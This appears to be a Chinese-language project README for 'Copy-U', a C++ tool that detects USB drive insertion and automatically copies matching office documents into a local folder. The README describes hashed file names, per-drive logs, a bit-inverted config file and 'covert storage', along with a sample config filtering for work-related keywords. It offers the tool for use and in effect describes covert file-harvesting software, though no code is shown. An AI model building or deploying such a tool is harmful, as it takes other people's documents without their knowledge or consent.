# Copy-U

`Copy-U` 是一个用于监听 USB 设备（U盘）插入并自动复制其中文件的工具。

## 功能特点

- **自动检测**：当检测到 U 盘插入时，工具会自动触发复制操作。
- **文件复制**：U 盘中的文件将自动复制到data文件夹中。
- **日志文件**：复制成功的文件信息会被存储在log文件夹下其盘符序列号对应的json中。
- **加密操作**：配置文件(按位取反),隐式存储文件及记录。
- **依赖库**：该项目依赖于 `cupfunc.dll`，用于处理与 U 盘的交互。


**data目录结构**：
`u盘序列号/文件的父路径(哈希)/文件名(哈希)`
**日志文件结构**：
```
{
	"17411342879911263551(文件的父路径hash)": 
	{
		"files": 
		{
			"5996570075586381162(文件名hash)": 
			{
				"modified_time": 1708908358,
				"original_filename": "filename.txt",
				"size": 2947977
			}
		},
		"original_path": "F:\\"
	}
}
```

## 安装和依赖

1. **下载 `cupfunc.dll`**：
   该项目依赖于 [cupfunc.dll](https://github.com/Xpercent/cupfunc)，你需要先下载并配置 `cupfunc.dll`，确保它可以在你的项目中正确引用。
2. **第三方库`json.cpp`**：
   使用vcpkg安装jsoncpp `vcpkg install jsoncpp`

2. **运行环境**：
   C++17

## 使用说明

#### 配置文件: `config.json`
对`config.json`使用 [invertBits](https://github.com/Xpercent/invertBits) 工具进行按位取反
```
{
	"AllowedExtensions": [".docx",".xlsx",".doc",".xls",".xlsm"],
	"Keywords": ["表","单","通知","工作","项"],
	"MaxFileSize": 1048576000
}
```